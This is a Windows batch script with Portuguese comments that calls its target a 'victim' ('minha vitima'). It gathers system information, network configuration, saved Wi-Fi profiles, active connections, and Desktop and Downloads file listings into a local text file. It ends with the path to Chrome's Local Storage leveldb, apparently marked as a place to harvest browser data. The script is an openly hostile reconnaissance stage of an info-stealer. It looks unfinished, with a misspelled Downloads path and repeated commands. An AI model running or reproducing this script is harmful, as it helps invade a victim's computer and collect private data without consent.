@echo off
cls
echo ----------------------------------------- >> config\system_information.txt
cls
echo ifo do PC da minha vitima %username% >> config\system_information.txt
cls
echo ----------------------------------------- >> config\system_information.txt
cls
systeminfo >> config\system_information.txt
cls
echo ----------------------------------------- >> config\system_information.txt
cls
echo todos os IPs do pc/rede >> config\system_information.txt
cls
echo ----------------------------------------- >> config\system_information.txt
cls
ipconfig /all >> config\system_information.txt
cls
echo ----------------------------------------- >> config\system_information.txt
cls
echo todas as redes wifi que esse pc se conectou >> config\system_information.txt
cls
echo ----------------------------------------- >> config\system_information.txt
cls
netsh wlan show profiles >> config\system_information.txt
cls
echo ----------------------------------------- >> config\system_information.txt
cls
echo todas as pessoas que estão nessa rede >> config\system_information.txt
cls
echo ----------------------------------------- >> config\system_information.txt
cls
netstat >> config\system_information.txt
cls
echo ----------------------------------------- >> config\system_information.txt
cls
echo Todos arquivos dentro do Desktop >> config\system_information.txt
cls
echo ----------------------------------------- >> config\system_information.txt
cls
cd C:\Users\%username%\Desktop & dir >> config\system_information.txt
cls
echo ----------------------------------------- >> config\system_information.txt
cls
echo Todos arquivos dentro de Download >> config\system_information.txt
cls
echo ----------------------------------------- >> config\system_information.txt
cls
cd C:\Users\%username%\Download & dir >> config\system_information.txt
cls
echo ----------------------------------------- >> config\system_information.txt
cls
echo estração de informações terminou >> config\system_information.txt
cls
echo ----------------------------------------- >> config\system_information.txt





cd C:\Users\%username%\Desktop & dir >> config\system_information.txt
cd C:\Users\%username%\Download & dir >> config\system_information.txt

%LOCALAPPDATA%\Google\Chrome\User Data\Profile 1\Local Storage\leveldb
